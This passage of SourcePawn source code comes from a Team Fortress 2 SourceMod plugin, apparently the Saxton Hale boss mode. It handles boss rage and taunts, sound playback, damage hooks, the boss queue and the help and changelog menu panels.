					EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
				}
				else if (Special==1)
					Format(s,256,"../%s",VagineerLastA);
				else if (bNewResponces)
				{
					if (!GetRandomInt(0,3))
						Format(s,256,"../%s",Arms);
					else if (!GetRandomInt(0,3))
						Format(s,256,"%s0%i.wav",HaleLastB,GetRandomInt(1,4));
					else
						Format(s,256,"../%s%i.mdl",HaleLastMan,GetRandomInt(1,5));
				}
				else
				{
					if (!GetRandomInt(0,1))
						Format(s,256,"../%s",Arms);
					else
						Format(s,256,"%s0%i.wav",HaleLastB,GetRandomInt(1,4));
				}
				
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, false, 0.0);
			}
		}
		if (Special==1)
			PrintCenterTextAll("Vagineer showed his current HP: %i of %i",HaleHealth,HaleHealthMax);	
		else if (Special==2)
			PrintCenterTextAll("Horseless Headless Horsemann Junior showed his current HP: %i of %i",HaleHealth,HaleHealthMax);
		else if (Special==4)
			PrintCenterTextAll("Christian Brutal Sniper showed his current HP: %i of %i",HaleHealth,HaleHealthMax);
		else
			PrintCenterTextAll("Saxton Hale showed his current HP: %i of %i",HaleHealth,HaleHealthMax);
	}

	HPTime-=0.2;
	if (HPTime<0)
		HPTime=0.0;
	if (KSpreeTimer>0) 
	KSpreeTimer-=0.2;
	
	return Plugin_Continue;
}

public Action:DoTaunt(client, const String:command[], argc)
{
	if (!Enabled || (client!=Hale))
		return Plugin_Continue;
	new String:s[256];
	if (HaleRage/RageDMG==1)
	{
		new Float:pos[3];
		GetEntPropVector(client, Prop_Send, "m_vecOrigin", pos);
		if (Special==1)
			Format(s,256,"../%s",VagineerRageSound);
		else if (Special==2)
			Format(s,256,"%s",HHHRage);		
		else if (Special==4)
		{
			if (GetRandomInt(0,1))
				Format(s,256,"%s",CBS1);	
			else
				Format(s,256,"%s",CBS3);
			EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
		}
		else if (bNewResponces)
			Format(s,256,"../%s%i.mdl",HaleRageSound,GetRandomInt(1,4));
		else if (GetRandomInt(0,1))
			Format(s,256,"../%s",SaxtonHale);
		else	
			Format(s,256,"../%s",HaleRageSoundB);
		EmitSoundToAll(s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
		EmitSoundToAll(s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
		
		for (new i=1; i<=MaxClients; i++)
			if (IsClientInGame(i) && (i!=Hale))
			{
				EmitSoundToClient(i,s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
				EmitSoundToClient(i,s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
			}
		if (Special==1)
		{
			TF2_AddCondition(Hale,TFCond_Ubercharged,10.0);
			if ((HaleModelAT[1]>0) && IsValidEdict(HaleModelAT[1]))
				SetEntProp(HaleModelAT[1], Prop_Send,"m_nSkin",GetClientTeam(Hale));
			if ((HaleModelAT[0]>0) && IsValidEdict(HaleModelAT[0]))
				SetEntProp(HaleModelAT[0], Prop_Send,"m_nSkin",GetClientTeam(Hale));
			UberRageCount=0;
			CreateTimer(0.1,UseUberRage,_,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);	
			CreateTimer(0.6,UseRage,true);	
		}
		else
			CreateTimer(0.6,UseRage,false);	
		HaleRage=0;
	}
	return Plugin_Continue;
}

public Action:DoSuicice(client, const String:command[], argc)
{
	if (Enabled && (client==Hale) && (RoundState<=0))
		return Plugin_Handled;	
	return Plugin_Continue;	
}

public Action:UseRage(Handle:hTimer,any:mode)
{
	new Float:pos[3];
	new Float:pos2[3];
	new i;
	new Float:distance;
	TF2_RemoveCondition(Hale, TFCond_Taunting);	
	GetEntPropVector(Hale, Prop_Send, "m_vecOrigin", pos);
	for(i=1;i<=MaxClients;i++)
	if(IsValidEdict(i) && IsClientInGame(i) && IsPlayerAlive(i) && (i!=Hale))
	{
		GetEntPropVector(i, Prop_Send, "m_vecOrigin", pos2);
		distance=GetVectorDistance(pos,pos2);
		if (!TF2_HasCond(i,5) && (!mode) && (distance<RageDist) || (mode) && (distance<RageDist/4))
		{
			TF2_StunPlayer(i, 5.0, 0.0, TF_STUNFLAGS_GHOSTSCARE|TF_STUNFLAG_NOSOUNDOREFFECT, Hale);
			CreateTimer(5.0, RemoveEnt, AttachParticle(i,"yikes_fx",75.0));	
		}
	}
	i=-1;
	while ((i = FindEntityByClassname(i, "obj_sentrygun")) != -1)
	{
		GetEntPropVector(i, Prop_Send, "m_vecOrigin", pos2);
		distance=GetVectorDistance(pos,pos2);		
		if ((!mode) && (distance<RageDist) || (mode) && (distance<RageDist/4))
		{
			SetEntProp(i, Prop_Send, "m_bDisabled", 1);
			AttachParticle(i,"yikes_fx",75.0);
			SetEntProp(i, Prop_Send, "m_iHealth", GetEntProp(i, Prop_Send, "m_iHealth")/2);
			CreateTimer(8.0, EnableSG, i);	
		}
	}	
	return Plugin_Continue;
}

public Action:UseUberRage(Handle:hTimer,any:param)
{
	if ((Hale<=0) || !IsValidEdict(Hale))
		return Plugin_Continue;	
	new String:s[64];
	if (UberRageCount==1)
		TF2_RemoveCondition(Hale,TFCond_Taunting);
	else if (UberRageCount>90)
	{
		SetEntProp(Hale, Prop_Data, "m_takedamage", 2);
		if ((HaleModelAT[1]>0) && IsValidEdict(HaleModelAT[1]))
		{
			GetEdictClassname(HaleModelAT[1], s, sizeof(s));
			if (!StrEqual(s, "instanced_scripted_scene"))
				SetEntProp(HaleModelAT[1], Prop_Send,"m_nSkin",0);
		}
		if ((HaleModelAT[0]>0) && IsValidEdict(HaleModelAT[0]))
		{
			GetEdictClassname(HaleModelAT[0], s, sizeof(s));
			if (!StrEqual(s, "instanced_scripted_scene"))
				SetEntProp(HaleModelAT[0], Prop_Send,"m_nSkin",0);
		}
		return Plugin_Continue;
	}	
	SetEntProp(Hale, Prop_Data, "m_takedamage", 0);
	UberRageCount+=1;
	return Plugin_Continue;
}

public Action:PyroTimer(Handle:hTimer,any:client)
{
	if ((RoundState==2) || (client<=0) || !IsValidEdict(client) || !IsClientInGame(client) || !IsPlayerAlive(client))
	{
		KillTimer(hTimer);
		return Plugin_Continue;
	}
	new weapon=GetPlayerWeaponSlot(client,0);
	if ((weapon<=0) || !IsValidEdict(weapon))
	{
		KillTimer(hTimer);
		return Plugin_Continue;
	}
	new index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
	if (index==40)
	{
		KillTimer(hTimer);
		return Plugin_Continue;
	}
	if ((index==215) && (GetEntData(client, FindDataMapOffs(client, "m_iAmmo")+4)>MaxPyroAmmo+MaxPyroAmmo/2))
		SetEntData(client, FindDataMapOffs(client, "m_iAmmo")+4,MaxPyroAmmo+MaxPyroAmmo/2);
	else if (GetEntData(client, FindDataMapOffs(client, "m_iAmmo")+4)>MaxPyroAmmo)
		SetEntData(client, FindDataMapOffs(client, "m_iAmmo")+4,MaxPyroAmmo);

	return Plugin_Continue;
}

public Action:event_player_death(Handle:event, const String:name[], bool:dontBroadcast)
{
	decl String:s[256];
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));
	new attacker=GetClientOfUserId(GetEventInt(event, "attacker"));
	SDKUnhook(client, SDKHook_OnTakeDamage, TakeDamageHook);
	if (client!=Hale && (RoundState==1))
	{
		PrintCenterText(client,"Your damage is: %i",Damage[client]);	
		PrintToChat(client,"Your damage is: %i",Damage[client]);
	}
	if ((client==Hale) && ((RoundState==1) || tf_medieval))
	{
		switch (Special)
		{
			case 2:
				EmitSoundToAll("ui/halloween_boss_defeated_fx.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			case 0:
				if (bNewResponces)
				{
					Format(s,256,"../%s%i.mdl",HaleFail,GetRandomInt(1,3));
					EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
					EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				}
		}
		if (HaleHealth<0)
			HaleHealth=0;
		if (tf_medieval || !bArena && (RoundState>0))
			ForceTeamWin(Team);
		return Plugin_Continue;
	}
	if ((attacker==Hale) && (RoundState==1))
	{	
		switch (Special)
		{
			case 0:
			if (bNewResponces && !GetRandomInt(0,2))
			{
				Format(s,256,"");
				switch (TF2_GetPlayerClass(client))
				{					
					case TFClass_Medic:	 Format(s,256,"../%s",HaleKillMedic);	
					case TFClass_Sniper:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillSniper1);
						else Format(s,256,"../%s",HaleKillSniper2);
					}
					case TFClass_Spy:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillSpy1);
						else Format(s,256,"../%s",HaleKillSpy2);
					}
					case TFClass_Engineer:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillEngie1);
						else Format(s,256,"../%s",HaleKillEngie2);
					}
				}
				if (!StrEqual(s,""))
				{
					EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);				
					EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);				
				}
			}
			case 1:
			{
				Format(s,256,"../%s",VagineerHit);
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
			case 2:
			{
				Format(s,256,"%s0%i.wav",HHHAttack,GetRandomInt(1,4));
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
		}	
		if (!bArena)
			ChangeClientTeam(client, 1);
		if (KSpreeTimer>0)
			KSpreeCount++;
		else
			KSpreeCount=1;
		if (KSpreeCount==3) 
		{
			switch (Special)
			{
				case 0:
				{
					if (bNewResponces)
					{
						if (GetRandomInt(0,4)==1)
							Format(s,256,"../%s",HaleKSpree);
						else if (GetRandomInt(0,3)==1)
							Format(s,256,"../%s",HaleKSpree2);
						else
							Format(s,256,"../%s%i.mdl",HaleKSpreeNew,GetRandomInt(1,5));
					}
					else
					{
						if (!GetRandomInt(0,1))
							Format(s,256,"../%s",HaleKSpree);
						else
							Format(s,256,"../%s",HaleKSpree2);
					}
				}
				case 1:
				{
					if (GetRandomInt(0,1))
						Format(s,256,"../%s",VagineerKSpree);
					else
						Format(s,256,"../%s",VagineerKSpree2);
				}
				case 2: Format(s,256,"%s0%i.wav",HHHLaught,GetRandomInt(1,4));
				case 4:
				{
					if (!GetRandomInt(0,3))
						Format(s,256,CBS0);
					else if (!GetRandomInt(0,3))
						Format(s,256,CBS1);
					else
						Format(s,256,"%s0%i.wav",CBS2,GetRandomInt(1,9));	
					EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _,NULL_VECTOR, NULL_VECTOR, false, 0.0);
				}
			}
			EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale,NULL_VECTOR, NULL_VECTOR, false, 0.0);
			EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			KSpreeCount=0;
		}
		else
			KSpreeTimer=5.0;
	}
	if (TF2_GetPlayerClass(client) == TFClass_Engineer)
	{
		for (new ent=MaxClients+1;ent<ME;ent++)
		if (IsValidEdict(ent))
		{
			GetEdictClassname(ent, s, sizeof(s));
			if (((StrContains(s,"obj_sentrygun")==0) || (StrContains(s,"obj_dispenser")==0) || (StrContains(s,"obj_teleporter_")==0)) && (GetEntPropEnt(ent, Prop_Send, "m_hBuilder")==client))
			{
				Format(s,6,"%i",GetEntPropEnt(ent, Prop_Send, "m_iMaxHealth")+1);
				SetVariantString(s);
				AcceptEntityInput(ent, "RemoveHealth");
				FakeClientCommand(client, "destroy 0");
					
				new Handle:tevent = CreateEvent("object_removed", true);
				SetEventInt(tevent, "userid", GetClientUserId(client));
				SetEventInt(tevent, "index", ent);
				FireEvent(tevent);
				AcceptEntityInput(ent, "kill");
			}
		}
	}	
	return Plugin_Continue;
}

public Action:event_hurt(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	new attacker=GetClientOfUserId(GetEventInt(event, "attacker"));	
	new damage=GetEventInt(event, "damageamount");	
	if ((client!=Hale) || !IsValidEdict(client) || !IsValidEdict(attacker) || (client<=0) || (attacker<=0) || (attacker>MaxClients))
		return Plugin_Continue;
	else if (!IsClientConnected(attacker) || !IsClientConnected(client) || (damage>1000))
		return Plugin_Continue;
	new ent=-1;
	if (bool:GetEventInt(event, "crit") || TF2_HasCond(attacker,19))
	{
		HaleHealth-=damage*2/3;
		HaleRage+=damage*2/3;
		Damage[attacker]+=damage*2/3;		
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
		new clients[2];
		clients[0]=client;
		clients[1]=attacker;
		EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		decl Float:Pos[3];
		Pos[2]+=60;
		GetEntPropVector(client, Prop_Send, "m_vecOrigin", Pos);
	}
	else if (bool:GetEventInt(event, "minicrit"))
	{	
		HaleHealth-=damage/4;
		HaleRage+=damage/4;
		Damage[attacker]+=damage/4;
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
	}
	else if (TF2_HasCond(client,13))
		SetEntityHealth(client,GetClientHealth(client)-50);
	else 
	{
		while ((ent = FindEntityByClassname(ent, "tf_wearable_item_demoshield")) != -1)
			if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
				return Plugin_Handled;		
	}
	return Plugin_Continue;
}

public Action:TakeDamageHook(client, &attacker, &inflictor, &Float:damage, &damagetype)
{
	if (!Enabled || !IsValidEdict(attacker) || ((attacker<=0) && (client==Hale)) || TF2_HasCond(client,5))
		return Plugin_Continue;		
	decl Float:Pos[3];
	GetEntPropVector(attacker, Prop_Send, "m_vecOrigin", Pos);
	if ((attacker==Hale) && IsValidEdict(client) && IsClientInGame(client)  && (client>0) && (client!=Hale) && (damagetype!=9001) && !TF2_HasCond(client,14) && !TF2_HasCond(client,13) && !TF2_HasCond(client,5))
	{
		if (TF2_GetPlayerClass(client) == TFClass_DemoMan)
		{
			new ent=-1;
			while ((ent = FindEntityByClassname(ent, "tf_wearable_item_demoshield")) != -1)
			{
				if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
				{
					RemoveEdict(ent);
					new clients[2];
					clients[0]=client;
					clients[1]=attacker;
					EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					TF2_AddCondition(client,TFCond_Bonked,0.1);
					return Plugin_Continue;						
				}
			}		
		}
		else if (TF2_GetPlayerClass(client) == TFClass_Spy)
		{
			new health=GetClientHealth(client);
			if (health<=50)
				FakeClientCommand(client,"kill");
			else
				SetEntityHealth(client,health-50);
		}
		if (Special==4)
			damagetype=DMG_BLAST;
		else
			damagetype=DMG_GENERIC;
		return Plugin_Changed;
	}
	else if ((attacker!=Hale) && (client==Hale))
	{
		if (attacker<=MaxClients)
		{
			if ((TF2_GetPlayerClass(attacker)==TFClass_Spy) && (damage>1000.0))
			{
				damage=HaleHealthMax*(0.12-Stabbed/90);
				Damage[attacker]+=RoundFloat(damage);
				if ((Damage[attacker]>9000) && (Damage[attacker]-RoundFloat(damage)<=9000))
				{
					EmitSoundToClient(attacker,"../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
				}	
				HaleHealth-=RoundFloat(damage);
				HaleRage+=RoundFloat(damage);
				if (HaleRage>RageDMG)
					HaleRage=RageDMG;
				damage=0.0;
				new clients[2];
				clients[0]=client;
				clients[1]=attacker;
				EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
				SetEntPropEnt(attacker, Prop_Send, "m_hActiveWeapon", GetPlayerWeaponSlot(attacker, 0));
				PrintCenterText(attacker,"STABBED");	
				PrintCenterText(client,"You was Stabbed");	
				if (Stabbed<5)
					Stabbed++;
				return Plugin_Changed;
			}	
			Damage[attacker]+=RoundFloat(damage);
		}
		HaleHealth-=RoundFloat(damage);
		HaleRage+=RoundFloat(damage);
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
	}
	return Plugin_Continue;
}


stock bool:TF2_HasCond(client,i)
{
	new pcond = GetEntProp(client, Prop_Send, "m_nPlayerCond");
	return pcond >= 0 ? ((pcond & (1 << i)) != 0) : false;
}  

stock FindNextHale(lHale)
{
	new tHale=lHale;
	new bool:bNewLape=false;
	new pingas=0;
	while ((!bonplay[tHale] || (tHale==lHale) || !IsClientConnected(tHale)) && (playing>=2) && (pingas<100))
	{
		pingas++;
		if (pingas==100)
			LogError("Breaking infinite loop, when plugin try find next Hale");
		tHale++;	
		if (tHale>MaxClients)
		{
			tHale=0;
			bNewLape=true;
		}
		if (bonplay[tHale] && bNewLape)
			break;
	}	
	return tHale;
}

ForceTeamWin (team){
	new ent = FindEntityByClassname(-1, "team_control_point_master");
	if (ent == -1)
	{
		ent = CreateEntityByName("team_control_point_master");
		DispatchSpawn(ent);
		AcceptEntityInput(ent, "Enable");
	}
	SetVariantInt(team);
	AcceptEntityInput(ent, "SetWinner");
}

stock AttachParticle(ent, String:particleType[],Float:offset=0.0)
{
	new particle = CreateEntityByName("info_particle_system");
	
	new String:tName[128];
	new Float:pos[3];
	GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos);
	pos[2]+=offset;
	TeleportEntity(particle, pos, NULL_VECTOR, NULL_VECTOR);
	
	Format(tName, sizeof(tName), "target%i", ent);
	DispatchKeyValue(ent, "targetname", tName);
	
	DispatchKeyValue(particle, "targetname", "tf2particle");
	DispatchKeyValue(particle, "parentname", tName);
	DispatchKeyValue(particle, "effect_name", particleType);
	DispatchSpawn(particle);
	SetVariantString(tName);
	AcceptEntityInput(particle, "SetParent", particle, particle, 0);
	SetEntPropEnt(particle, Prop_Data, "m_hOwnerEntity",ent);
	ActivateEntity(particle);
	AcceptEntityInput(particle, "start");
	return particle;
}

stock SpawnWeapon(client,String:name[],index,level,qual,String:att[])
{		
	new Handle:hWeapon = TF2Items_CreateItem(OVERRIDE_CLASSNAME | OVERRIDE_ITEM_DEF | OVERRIDE_ITEM_LEVEL | OVERRIDE_ITEM_QUALITY | OVERRIDE_ATTRIBUTES);
	TF2Items_SetClassname(hWeapon, name);
	TF2Items_SetItemIndex(hWeapon, index);
	TF2Items_SetLevel(hWeapon, level);
	TF2Items_SetQuality(hWeapon, qual);
	new String:atts[32][32];
	new count = ExplodeString(att, " ; ", atts, 32, 32);
	if (count > 0)
	{
		TF2Items_SetNumAttributes(hWeapon, count/2);
		new i2 = 0;
		for (new i = 0; i < count; i+=2)
		{
			TF2Items_SetAttribute(hWeapon, i2, StringToInt(atts[i]), StringToFloat(atts[i+1]));
			i2++;
		}
	}
	else
		TF2Items_SetNumAttributes(hWeapon, 0);
	if (hWeapon==INVALID_HANDLE)
		return -1;
	new entity = TF2Items_GiveNamedItem(client, hWeapon);
	EquipPlayerWeapon(client, entity);
	return entity;
}

public HintPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		return;   
	}
}
  
public Action:HintPanel(client, Args)
{
	new Handle:panel = CreatePanel();
	new String:s[512];
	switch (Special)
	{
		case 0: 
			DrawPanelText(panel,"===Saxton Hale===\nSuper Jump: crouch, look up and stand up.\nRage (stun): do taunt when Rage Meter is full.");
		case 1:
			DrawPanelText(panel,"===Vagineer===\nSuper Jump: crouch, look up and stand up.\nRage (uber): do taunt when Rage Meter is full.");
		case 2: 
			DrawPanelText(panel,"===Horseless Headless Horsemann Junior===\nTeleporter: crouch, look up and stand up.\nRage (stun): do taunt when Rage Meter is full.");
		case 4: 
			Format(s,512,"===Christian Brutal Sniper: Winter Holidays Event===\nSuper Jump: crouch, look up and stand up.\nRage (stun): do taunt when Rage Meter is full.");
	}
	if (tf_medieval)
		DrawPanelText(panel,"On Medieval Mode TEAM members will be respawn after death.");
	DrawPanelItem(panel,"Exit");
	SendPanelToClient(panel, client, QueuePanelH, 9001);
	CloseHandle(panel);
}

public QueuePanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (param1==9001)
	{
		if (!bSpecials)
		{
			Special=0;
			return true;  
		}
		decl String:see[8];
		decl String:ci[8];
		FormatTime(ci,8,"%m");
		FormatTime(see,8,"%d");
		new pingas=StringToInt(see);
		Special=Incoming;
		if (Special==0)
		{
			Special=GetRandomInt(0,15);
			if (((pingas>=25) && StrEqual(ci,"12")) || (StrEqual(ci,"1") || StrEqual(ci,"01") && (pingas<=7)))
			{
				if (Special>11)
					Special=4;
				else if (Special==11)
					Special=1;
				else if (Special==10)
					Special=2;
				else
					Special=0;
			}
			else
			{
				if (Special==12)
					Special=1;
				else if (Special==11)
					Special=2;
				else
					Special=0;		
			}
		}
		Incoming=0;
		return true;  
	}
	if (action == MenuAction_Select)
		return false; 
}
  
public Action:QueuePanel(client, Args)
{
	new Handle:panel = CreatePanel();
	new String:s[512];
	SetPanelTitle(panel, "Saxton Hale's Queue");
	new tHale=Hale;			
	if ((tHale<=0) || !IsValidEdict(tHale))
		tHale=FindNextHale(tHale);		
	GetClientName(tHale, s, 64);
	Format(s,512,"Curret Hale is %s",s);
	DrawPanelText(panel,s);
	new i;
	do
	{
		tHale=FindNextHale(tHale);	
		if (IsValidEdict(tHale) && IsClientInGame(tHale))
		{
			GetClientName(tHale, s, 64);
			DrawPanelItem(panel,s);
			i++;
		}
	}
	while ((tHale!=Hale) && (i<10));
	SendPanelToClient(panel, client, QueuePanelH, 9001);
	CloseHandle(panel);
}

public HalePanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
			Command_GetHP(param1, 0);
		else if (param2==2)
			HelpPanel(param1, 0);
		else if (param2==3)
			NewPanel(param1, 0);
		else if (param2==4)	
			QueuePanel(param1,0);
		else
			return;   
	}
}
  
public Action:HalePanel(client, Args)
{
	new Handle:panel = CreatePanel();
	SetPanelTitle(panel, "What do you want, sir?");
	DrawPanelItem(panel, "Show Hale's Health (/halehp).");
	DrawPanelItem(panel, "Help about the mode (/halehelp).");
	DrawPanelItem(panel, "What's new? (/halenew).");
	DrawPanelItem(panel, "Who is the next? (/halenext).");
	DrawPanelItem(panel, "Exit");  
	SendPanelToClient(panel, client, HalePanelH, 9001);
	CloseHandle(panel);
}

public NewPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
		{
			if (!curhelp[param1])
				NewPanel(param1,112);
			else if (curhelp[param1]==112)
				NewPanel(param1,111);
			else if (curhelp[param1]==111)
				NewPanel(param1,110);
			else
				NewPanel(param1,100);
		}
		else if (param2==2)
		{
			if (curhelp[param1]==100)
				NewPanel(param1,110);
			else if (curhelp[param1]==110)
				NewPanel(param1,111);
			else if (curhelp[param1]==111)
				NewPanel(param1,112);
			else
				NewPanel(param1,0);
		}
		if (param2==3)
			return;  
	}
}
  
public Action:NewPanel(client, Args)
{
	curhelp[client]=Args;
	new Handle:panel = CreatePanel();
	new String:s[90];
	if (!Args)
		Format(s,90,"=What's new in v.%s:=",PLUGIN_VERSION);
	else
		Format(s,90,"=What's new in v.%i.%i:=",Args/100,Args%100);
	SetPanelTitle(panel, s);
	if (!Args)
	{
		DrawPanelText(panel, "1)Added new Hale's phrases.");
		DrawPanelText(panel, "2)More bugfixes.");
		DrawPanelText(panel, "3)Improved super-jump.");
	}
	if (Args==112)
	{
		DrawPanelText(panel, "1)More bugfixes.");
		DrawPanelText(panel, "2)Now \"(Hale)<mapname>\" can be nominated for nextmap.");
		DrawPanelText(panel, "3)Medigun's uber gets uber and crits for Medic and his target.");
		DrawPanelText(panel, "4)Fixed infinite Specials.");
		DrawPanelText(panel, "5)And more bugfixes.");
	}
	if (Args==111)
	{
		DrawPanelText(panel, "1)Fixed immortal spy");
		DrawPanelText(panel, "2)Fixed crashes associated with classlimits.");
	}
	if (Args==110)
	{
		DrawPanelText(panel, "1)Not important changes on code.");
		DrawPanelText(panel, "2)Added hale_enabled convar.");
		DrawPanelText(panel, "3)Fixed bug, when all hats was removed...why?");
	}
	else if (Args==100)
	{
		DrawPanelText(panel, "Released!!!");
		DrawPanelText(panel, "On new version you will get info about changes.");
	}
	if (Args!=10)
		DrawPanelItem(panel, "Older"); 
	else
		DrawPanelItem(panel, "No older."); 
	if (Args>0)
		DrawPanelItem(panel, "Newer");  
	else 
		DrawPanelItem(panel, "No newer"); 
	DrawPanelItem(panel, "Exit");   
	SendPanelToClient(panel, client, NewPanelH, 9001);
	CloseHandle(panel);
}

public HelpPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
			HelpPanel1(param1, 0);
		else if (param2==2)
			return;   
	}
}
  
public Action:HelpPanel(client, Args)
{
